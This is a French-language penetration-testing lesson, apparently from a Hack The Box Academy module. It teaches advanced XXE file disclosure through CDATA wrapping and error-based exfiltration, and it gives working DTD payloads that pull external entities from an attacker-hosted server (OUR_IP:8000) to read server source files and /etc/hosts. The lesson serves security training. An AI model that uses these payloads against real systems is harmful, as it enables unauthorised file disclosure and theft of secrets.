Divulgation avancée des fichiers
================================

* * * * *

Toutes les vulnérabilités XXE peuvent ne pas être simples à exploiter, comme nous l'avons vu dans la section précédente. Certains formats de fichiers peuvent ne pas être lisibles via XXE de base, tandis que dans d'autres cas, l'application Web peut ne pas générer de valeurs d'entrée dans certains cas, nous pouvons donc essayer de la forcer à traverser des erreurs.

* * * * *

Exfiltration avancée avec CDATA
-------------------------------

Dans la section précédente, nous avons vu comment nous pouvions utiliser des filtres PHP pour encoder les fichiers source PHP, de sorte qu'ils ne cassent pas le format XML lorsqu'ils sont référencés, ce qui (comme nous l'avons vu) nous empêchait de lire ces fichiers. Mais qu'en est-il des autres types d'applications Web ? Nous pouvons utiliser une autre méthode pour extraire tout type de données (y compris les données binaires) pour tout backend d'application Web. Pour sortir des données qui ne sont pas conformes au format XML, nous pouvons envelopper le contenu de la référence du fichier externe avec une `CDATA`balise (par exemple `<![CDATA[ FILE_CONTENT ]]>`). De cette façon, l'analyseur XML considérerait cette partie comme des données brutes, qui peuvent contenir n'importe quel type de données, y compris des caractères spéciaux.

Un moyen simple de résoudre ce problème serait de définir une `begin`entité interne avec `<![CDATA[`, une `end`entité interne avec `]]>`, puis de placer notre fichier d'entité externe entre les deux, et il devrait être considéré comme un `CDATA`élément, comme suit :

Code : xml

```
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>

```

Après cela, si nous référençons l' `&joined;`entité, elle doit contenir nos données échappées. Cependant, `this will not work, since XML prevents joining internal and external entities`nous devrons donc trouver une meilleure façon de le faire.

Pour contourner cette limitation, nous pouvons utiliser `XML Parameter Entities`, un type spécial d'entité qui commence par un `%`caractère et ne peut être utilisé que dans la DTD. Ce qui est unique avec les entités paramètres, c'est que si nous les référençons à partir d'une source externe (par exemple, notre propre serveur), alors toutes seront considérées comme externes et peuvent être jointes, comme suit :

Code : xml

```
<!ENTITY joined "%begin;%file;%end;">

```

Essayons donc de lire le `submitDetails.php`fichier en stockant d'abord la ligne ci-dessus dans un fichier DTD (par exemple `xxe.dtd`), en l'hébergant sur notre machine, puis en la référençant en tant qu'entité externe sur l'application Web cible, comme suit :

```
dsgsec@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
dsgsec@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Maintenant, nous pouvons référencer notre entité externe ( `xxe.dtd`) puis imprimer l' `&joined;`entité que nous avons définie ci-dessus, qui doit contenir le contenu du `submitDetails.php`fichier, comme suit :

Code : xml

```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->

```

Une fois que nous avons écrit notre `xxe.dtd`fichier, l'avons hébergé sur notre machine, puis ajouté les lignes ci-dessus à notre requête HTTP à l'application Web vulnérable, nous pouvons enfin obtenir le contenu du `submitDetails.php`fichier : ![php_cdata](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_cdata.jpg)

Comme nous pouvons le constater, nous avons pu obtenir le code source du fichier sans avoir besoin de l'encoder en base64, ce qui permet de gagner beaucoup de temps lors de la recherche de secrets et de mots de passe dans divers fichiers.

Remarque : Dans certains serveurs Web modernes, nous ne pourrons peut-être pas lire certains fichiers (comme index.php), car le serveur Web empêcherait une attaque DOS causée par l'auto-référence de fichier/entité (par exemple, boucle de référence d'entité XML) , comme mentionné dans la section précédente.

Cette astuce peut devenir très pratique lorsque la méthode XXE de base ne fonctionne pas ou lorsqu'il s'agit d'autres frameworks de développement Web. `Try to use this trick to read other files`.

* * * * *

XXE basé sur les erreurs
------------------------

Une autre situation dans laquelle nous pouvons nous trouver est celle où l'application Web peut ne pas écrire de sortie, de sorte que nous ne pouvons contrôler aucune des entités d'entrée XML pour écrire son contenu. Dans de tels cas, nous serions `blind`à la sortie XML et ne serions donc pas en mesure de récupérer le contenu du fichier en utilisant nos méthodes habituelles.

Si l'application Web affiche des erreurs d'exécution (par exemple, des erreurs PHP) et ne dispose pas d'une gestion appropriée des exceptions pour l'entrée XML, nous pouvons utiliser cette faille pour lire la sortie de l'exploit XXE. Si l'application Web n'écrit pas de sortie XML ni n'affiche d'erreurs, nous serions confrontés à une situation complètement aveugle, dont nous parlerons dans la section suivante.

Considérons l'exercice que nous avons `/error`à la fin de cette section, dans lequel aucune des entités d'entrée XML n'est affichée à l'écran. Pour cette raison, nous n'avons aucune entité que nous pouvons contrôler pour écrire la sortie du fichier. Essayons d'abord d'envoyer des données XML malformées et voyons si l'application Web affiche des erreurs. Pour ce faire, nous pouvons supprimer n'importe laquelle des balises de fermeture, en modifier une pour qu'elle ne se ferme pas (par exemple `<roo>`à la place de `<root>`), ou simplement référencer une entité inexistante, comme suit : ![cause_error](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_cause_error.jpg)

Nous voyons que nous avons effectivement provoqué l'affichage d'une erreur dans l'application Web, et cela a également révélé le répertoire du serveur Web, que nous pouvons utiliser pour lire le code source d'autres fichiers. Maintenant, nous pouvons exploiter cette faille pour exfiltrer le contenu du fichier. Pour ce faire, nous utiliserons une technique similaire à celle que nous avons utilisée précédemment. Tout d'abord, nous allons héberger un fichier DTD contenant la charge utile suivante :

Code : xml

```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

```

La charge utile ci-dessus définit l' `file`entité de paramètre, puis la joint à une entité qui n'existe pas. Dans notre exercice précédent, nous joignions trois chaînes. Dans ce cas, `%nonExistingEntity;`n'existe pas, de sorte que l'application Web génère une erreur indiquant que cette entité n'existe pas, ainsi que notre joint `%file;`dans le cadre de l'erreur. De nombreuses autres variables peuvent provoquer une erreur, comme un mauvais URI ou des caractères incorrects dans le fichier référencé.

Maintenant, nous pouvons appeler notre script DTD externe, puis référencer l' `error`entité, comme suit :

Code : xml

```
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>

```

Une fois que nous avons hébergé notre script DTD comme nous l'avons fait précédemment et envoyé la charge utile ci-dessus en tant que nos données XML (inutile d'inclure d'autres données XML), nous obtiendrons le contenu du `/etc/hosts`fichier comme suit : ![erreur_exfil](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg)

Cette méthode peut également être utilisée pour lire le code source des fichiers. Tout ce que nous avons à faire est de changer le nom du fichier dans notre script DTD pour qu'il pointe vers le fichier que nous voulons lire (par exemple `"file:///var/www/html/submitDetails.php"`). Cependant, `this method is not as reliable as the previous method for reading source files`, car il peut avoir des limites de longueur, et certains caractères spéciaux peuvent toujours le casser.
